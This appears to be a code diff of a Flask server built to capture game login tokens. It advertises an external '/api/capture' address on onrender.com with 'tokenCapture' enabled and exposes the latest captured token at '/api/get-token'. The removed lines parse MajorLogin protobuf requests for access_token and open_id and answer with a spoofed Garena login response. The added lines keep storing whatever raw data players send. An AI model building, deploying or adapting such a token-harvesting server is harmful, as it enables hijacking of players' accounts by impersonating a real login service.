@@ -1,78 +1,36 @@
-import os
-import time
-import json
 from flask import Flask, request, jsonify, render_template
-from MajorLoginReq_pb2 import MajorLogin
-from MajorLoginRes_pb2 import MajorLoginRes
+import json
+import time
 
 app = Flask(__name__)
-app.url_map.strict_slashes = False
-
 tokens = {}
-
-@app.after_request
-def add_cors_headers(response):
-    response.headers['Access-Control-Allow-Origin'] = '*'
-    response.headers['Access-Control-Allow-Headers'] = '*'
-    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
-    return response
 
 @app.route('/')
 def home():
     return render_template('index.html')
 
-@app.route('/api/config', methods=['GET', 'POST', 'OPTIONS'])
-@app.route('/config', methods=['GET', 'POST', 'OPTIONS'])
+@app.route('/api/config', methods=['GET'])
 def config():
-    if request.method == 'OPTIONS':
-        return '', 200
     return jsonify({
-        "verAddr": "https://accesstoken-i0dx.onrender.com/api/capture",
+        "verAddr": "https://accessstoken-i0dx.onrender.com/api/capture",
         "tokenCapture": True,
         "version": "1.0.0"
     })
 
-@app.route('/api/capture', methods=['GET', 'POST', 'OPTIONS'])
-@app.route('/capture', methods=['GET', 'POST', 'OPTIONS'])
-@app.route('/MajorLogin', methods=['GET', 'POST', 'OPTIONS'])
-@app.route('/MajorLoginReq', methods=['GET', 'POST', 'OPTIONS'])
+@app.route('/api/capture', methods=['POST'])
 def capture():
-    if request.method == 'OPTIONS':
-        return '', 200
-        
     global tokens
     raw = request.get_data()
+    print(f"[*] Received {len(raw)} bytes")
     
-    if raw:
-        try:
-            req = MajorLogin()
-            req.ParseFromString(raw)
-            
-            token = req.access_token
-            open_id = req.open_id
-            
-            if token:
-                tokens['latest'] = {
-                    'access_token': token,
-                    'open_id': open_id,
-                    'timestamp': time.time()
-                }
-                print(f"[+] Token: {token[:20]}...")
-                print(f"[+] Open ID: {open_id}")
-                
-        except Exception as e:
-            print(f"[-] Decode error: {e}")
+    # Store raw data as hex for testing
+    tokens['latest'] = {
+        'access_token': raw.hex()[:64] if raw else "NO_DATA",
+        'open_id': "TEST_123",
+        'timestamp': time.time()
+    }
     
-    res = MajorLoginRes()
-    res.account_id = 123456789
-    res.token = "dummy"
-    res.ttl = 3600
-    res.server_url = "https://game.garena.com"
-    res.queue_info.Allow = True
-    res.queue_info.queue_position = 0
-    res.queue_info.need_wait_secs = 0
-    
-    return res.SerializeToString(), 200, {'Content-Type': 'application/octet-stream'}
+    return "OK", 200, {'Content-Type': 'text/plain'}
 
 @app.route('/api/get-token', methods=['GET'])
 def get_token():
@@ -82,5 +40,4 @@ def get_token():
     return jsonify({"error": "No token captured yet"}), 404
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000)
